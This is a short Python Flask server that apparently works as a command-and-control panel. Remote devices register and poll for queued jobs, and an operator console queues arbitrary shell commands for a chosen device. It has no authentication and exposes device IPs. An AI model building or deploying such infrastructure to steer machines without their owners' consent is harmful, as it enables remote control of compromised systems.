from flask import Flask, request, jsonify
import threading
import time

app = Flask(__name__)


devices = {}
commands = {}

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    device_id = data['device_id']
    devices[device_id] = {
        'ip': request.remote_addr,
        'last_check_in': data['timestamp']
    }
    commands[device_id] = []
    return jsonify({'status': 'registered'})

# Endpoint for sending commands to devices
@app.route('/command/<device_id>', methods=['GET'])
def command(device_id):
    if device_id in devices:
        if commands[device_id]:
            return jsonify(commands[device_id].pop(0))
        else:
            return jsonify({'type': 'no_command', 'data': {}})
    else:
        return jsonify({'error': 'Device not found'}), 404

@app.route('/check_in', methods=['POST'])
def check_in():
    data = request.json
    device_id = data['device_id']
    if device_id in devices:
        devices[device_id]['last_check_in'] = data['timestamp']
        return jsonify({'status': 'checked_in'})
    else:
        return jsonify({'error': 'Device not registered'}), 404


@app.route('/devices', methods=['GET'])
def get_devices():
    return jsonify(devices)

def run_server():
    app.run(host='0.0.0.0', port=1241)

if __name__ == '__main__':
    server_thread = threading.Thread(target=run_server)
    server_thread.start()

    print("Server is running...")

    while True:
        print("\n1. View Devices\n2. Send Command\n3. Exit")
        choice = input("Choose an option: ")

        if choice == '1':
            print("Registered devices:")
            for device_id, info in devices.items():
                print(f"Device ID: {device_id}, Last Check-in: {info['last_check_in']}, IP: {info['ip']}")

        elif choice == '2':
            device_id = input("Enter device ID to send command: ")
            if device_id in devices:
                command_str = input("Enter command to send: ")
                command = {
                    'type': 'execute_command',
                    'data': {
                        'command': command_str,
                        'args': []
                    }
                }
                commands[device_id].append(command)
                print(f"Command sent to {device_id}")
            else:
                print("Device not found")

        elif choice == '3':
            print("Exiting...")
            break

        else:
            print("Invalid choice, please try again.")
